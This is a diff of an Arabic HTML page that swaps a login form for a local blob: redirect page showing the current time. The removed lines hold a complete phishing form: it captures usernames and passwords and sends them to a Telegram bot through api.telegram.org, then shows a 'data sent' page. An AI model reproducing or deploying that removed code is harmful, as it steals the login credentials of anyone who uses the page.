@@ -1,69 +1,83 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>تسجيل الدخول</title>
-<style>
-  body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
-  form { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-  input, button { display: block; width: 100%; padding: 10px; margin: 10px 0; }
-  button { background: #007bff; color: white; border: none; cursor: pointer; }
-  button:hover { background: #0056b3; }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>جارٍ التحويل إلى جلسة Blob…</title>
+  <style>
+    body{
+      font-family: system-ui, "Segoe UI", Arial;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      margin:0;
+      background:#0f172a;
+      color:#e2e8f0;
+    }
+    .card{
+      background:#111827;
+      padding:20px 26px;
+      border-radius:12px;
+      text-align:center;
+      box-shadow:0 8px 24px rgba(0,0,0,.35);
+    }
+    small{display:block;opacity:.75;margin-top:8px}
+  </style>
 </head>
 <body>
-<form id="loginForm">
-  <h2>تسجيل الدخول</h2>
-  <input type="text" id="username" placeholder="اسم المستخدم" required>
-  <input type="password" id="password" placeholder="كلمة المرور" required>
-  <button type="submit">تسجيل الدخول</button>
-</form>
+  <div class="card">
+    <h2>جاري فتح جلسة محلية (blob:)</h2>
+    <p>إذا لم يحدث تحويل تلقائي، انتظر ثانية أو حمّل الصفحة مجددًا.</p>
+    <small>لا يوجد أي تبادل بيانات خارجية — العملية تتم محليًا في متصفحك.</small>
+  </div>
 
-<script>
-const BOT_TOKEN = "ضع_التوكن_هنا";
-const CHAT_ID = "ضع_الـChatID_هنا";
+  <script>
+    (function(){
+      // محتوى الصفحة التي سيتم فتحها داخل جلسة blob
+      const blobHtml = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>صفحة من Blob</title>
+  <style>
+    body{font-family:system-ui,Segoe UI,Arial;display:grid;place-items:center;min-height:100vh;background:#111827;color:#e2e8f0;margin:0}
+    .wrap{max-width:720px;padding:24px;text-align:center}
+    h1{margin:0 0 8px;color:#22c55e}
+    p{line-height:1.6;color:#cbd5e1}
+    code{background:#0b1220;color:#93c5fd;padding:.2em .4em;border-radius:6px}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>✅ تم فتح الصفحة عبر <code>blob:</code></h1>
+    <p>هذه الصفحة مولَّدة محليًا داخل متصفحك باستخدام <code>URL.createObjectURL</code>.</p>
+    <p>الوقت الآن: <span id="now"></span></p>
+    <script>
+      document.getElementById('now').textContent = new Date().toLocaleString();
+    <\/script>
+  </div>
+</body>
+</html>`.trim();
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  let user = document.getElementById('username').value;
-  let pass = document.getElementById('password').value;
-  let message = `🔐 محاولة تسجيل دخول:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+      // إنشاء Blob وURL ثم الانتقال إليه فورًا
+      try {
+        const blob = new Blob([blobHtml], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
 
-  // إرسال البيانات إلى تيليجرام
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  })
-  .then(() => {
-    // بعد الإرسال، إنشاء صفحة blob وفتحها
-    const blobHtml = `
-      <!DOCTYPE html>
-      <html lang="ar">
-      <head>
-        <meta charset="UTF-8">
-        <title>تم الإرسال</title>
-        <style>
-          body { font-family: Arial; background: #111827; color: #f1f5f9; display: flex; justify-content: center; align-items: center; height: 100vh; }
-          .box { text-align: center; }
-          h1 { color: #22c55e; }
-        </style>
-      </head>
-      <body>
-        <div class="box">
-          <h1>✅ تم إرسال البيانات</h1>
-          <p>شكراً لك، تم فتح هذه الصفحة من رابط blob.</p>
-        </div>
-      </body>
-      </html>
-    `;
-    const blob = new Blob([blobHtml], { type: 'text/html' });
-    const url = URL.createObjectURL(blob);
-    window.open(url, '_blank', 'noopener');
-    setTimeout(() => URL.revokeObjectURL(url), 15000);
-  })
-  .catch(err => alert("حدث خطأ: " + err));
-});
-</script>
+        // فتح الـ blob في نفس النافذة (تغيير العنوان حقيقي)
+        // استخدم window.location.replace(url) إذا تبي تمنع الرجوع للصفحة الحالية
+        window.location.href = url;
+
+        // تنظيف الرابط المؤقت بعد 15 ثانية (نظريًا — يمكن أن يفشل التنظيف إذا تم التنقل بعيدًا جدًا)
+        setTimeout(() => {
+          try { URL.revokeObjectURL(url); } catch(e) { /* تجاهل أخطاء التنظيف */ }
+        }, 15000);
+      } catch (err) {
+        console.error('خطأ أثناء إنشاء جلسة blob:', err);
+      }
+    })();
+  </script>
 </body>
 </html>
